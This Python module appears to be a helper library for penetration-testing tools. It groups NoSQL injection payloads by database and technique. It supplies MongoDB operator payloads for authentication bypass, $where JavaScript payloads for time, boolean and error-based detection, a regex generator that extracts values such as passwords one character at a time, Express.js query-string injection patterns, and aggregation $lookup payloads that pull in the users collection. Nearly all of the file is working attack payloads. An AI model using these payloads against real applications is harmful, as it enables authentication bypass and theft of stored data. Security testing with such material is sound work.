"""
NoSQL injection payload helpers grouped by database type and technique.
These are reference payloads; adjust to the target application's context.
"""
from typing import Any, Dict, List


def get_operator_payloads(db_type: str = "mongodb") -> List[Dict[str, Any]]:
    """
    Get NoSQL operator injection payloads.

    Args:
        db_type: Database type ("mongodb", "couchdb", "elasticsearch")

    Returns:
        List of payload dictionaries
    """
    payloads = {
        "mongodb": [
            # Authentication bypass - not equal
            {"payload": {"$ne": ""}, "type": "ne_empty", "desc": "Not equal empty string"},
            {"payload": {"$ne": None}, "type": "ne_null", "desc": "Not equal null"},
            # Authentication bypass - greater than
            {"payload": {"$gt": ""}, "type": "gt_empty", "desc": "Greater than empty"},
            {"payload": {"$gte": ""}, "type": "gte_empty", "desc": "Greater or equal empty"},
            # Authentication bypass - less than (matches most strings)
            {"payload": {"$lt": "~"}, "type": "lt_tilde", "desc": "Less than tilde"},
            # Existence check bypass
            {"payload": {"$exists": True}, "type": "exists", "desc": "Field exists"},
            # Regex wildcard
            {"payload": {"$regex": ".*"}, "type": "regex_all", "desc": "Regex match all"},
            {"payload": {"$regex": ".*", "$options": "i"}, "type": "regex_all_i", "desc": "Case-insensitive regex"},
            # Array membership
            {"payload": {"$in": ["admin", "root", "administrator"]}, "type": "in_admins", "desc": "In admin list"},
            # Logical operators
            {"payload": {"$or": [{}, {}]}, "type": "or_empty", "desc": "OR with empty conditions"},
            {"payload": {"$and": [{"$ne": ""}]}, "type": "and_ne", "desc": "AND with $ne"},
        ],
        "couchdb": [
            {"payload": {"$or": [{}, {}]}, "type": "or_bypass", "desc": "OR condition bypass"},
            {"payload": {"$regex": ".*"}, "type": "regex_all", "desc": "Regex wildcard"},
        ],
        "elasticsearch": [
            {"payload": {"match_all": {}}, "type": "match_all", "desc": "Match all documents"},
            {"payload": {"wildcard": {"field": "*"}}, "type": "wildcard", "desc": "Wildcard query"},
        ],
    }
    return payloads.get(db_type, payloads["mongodb"])


def get_js_payloads(detection: str = "time") -> List[Dict[str, Any]]:
    """
    Get MongoDB JavaScript injection payloads ($where clause).

    Args:
        detection: Detection type ("time", "boolean", "error")

    Returns:
        List of payload dictionaries
    """
    payloads = []

    # Time-based detection
    if detection in ["time", "all"]:
        payloads.extend([
            {"payload": {"$where": "sleep(5000)"}, "delay": 5, "type": "sleep"},
            {"payload": {"$where": "sleep(5000) || true"}, "delay": 5, "type": "sleep_or_true"},
            {"payload": {"$where": "(function(){sleep(5000);return true;})()"}, "delay": 5, "type": "sleep_iife"},
        ])

    # Boolean-based detection
    if detection in ["boolean", "all"]:
        payloads.extend([
            {"payload": {"$where": "true"}, "expected": True, "type": "always_true"},
            {"payload": {"$where": "false"}, "expected": False, "type": "always_false"},
            {"payload": {"$where": "this.password.length > 0"}, "type": "password_exists"},
            {"payload": {"$where": "this.password.length > 10"}, "type": "password_length"},
        ])

    # Error-based detection
    if detection in ["error", "all"]:
        payloads.extend([
            {"payload": {"$where": "invalid syntax here"}, "type": "syntax_error"},
            {"payload": {"$where": "this.nonexistent.property"}, "type": "property_error"},
        ])

    return payloads


def get_regex_payloads(prefix: str = "", charset: str = "abcdefghijklmnopqrstuvwxyz0123456789") -> List[Dict[str, Any]]:
    """
    Get regex-based extraction payloads for character-by-character enumeration.

    Args:
        prefix: Known prefix of the target string
        charset: Characters to try

    Returns:
        List of payload dictionaries for each character
    """
    payloads = []
    for char in charset:
        test_prefix = prefix + char
        payloads.append({
            "payload": {"$regex": f"^{test_prefix}"},
            "char": char,
            "prefix": test_prefix,
            "type": "regex_enum",
        })
    return payloads


def get_query_string_payloads() -> List[Dict[str, Any]]:
    """
    Get query string injection payloads for Express.js extended parser.

    Returns:
        List of query string payload patterns
    """
    return [
        {"pattern": "field[$ne]=", "type": "qs_ne", "desc": "Query string $ne injection"},
        {"pattern": "field[$gt]=", "type": "qs_gt", "desc": "Query string $gt injection"},
        {"pattern": "field[$regex]=.*", "type": "qs_regex", "desc": "Query string $regex injection"},
        {"pattern": "field[$exists]=true", "type": "qs_exists", "desc": "Query string $exists injection"},
        {"pattern": "field[$in][0]=admin&field[$in][1]=root", "type": "qs_in", "desc": "Query string $in injection"},
        {"pattern": "filter[$or][0][field]=x&filter[$or][1][field]=y", "type": "qs_or", "desc": "Query string $or injection"},
    ]


def get_boolean_payloads() -> List[Dict[str, Any]]:
    """
    Get boolean-based inference payload pairs.

    Returns:
        List of true/false payload pairs
    """
    return [
        {
            "true_payload": {"$regex": "^a"},
            "false_payload": {"$regex": "^zzzzzzzzz"},
            "type": "regex_boolean",
        },
        {
            "true_payload": {"$ne": ""},
            "false_payload": {"$eq": "impossiblevalue12345"},
            "type": "ne_eq_boolean",
        },
        {
            "true_payload": {"$gt": ""},
            "false_payload": {"$lt": ""},
            "type": "gt_lt_boolean",
        },
    ]


def get_aggregation_payloads() -> List[Dict[str, Any]]:
    """
    Get MongoDB aggregation pipeline injection payloads.

    Returns:
        List of aggregation payloads (use with caution)
    """
    return [
        {"payload": {"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "leaked"}}, "type": "lookup", "desc": "Cross-collection lookup"},
        {"payload": {"$group": {"_id": None, "all": {"$push": "$$ROOT"}}}, "type": "group_all", "desc": "Group all documents"},
        {"payload": {"$match": {}}, "type": "match_all", "desc": "Match all documents"},
    ]
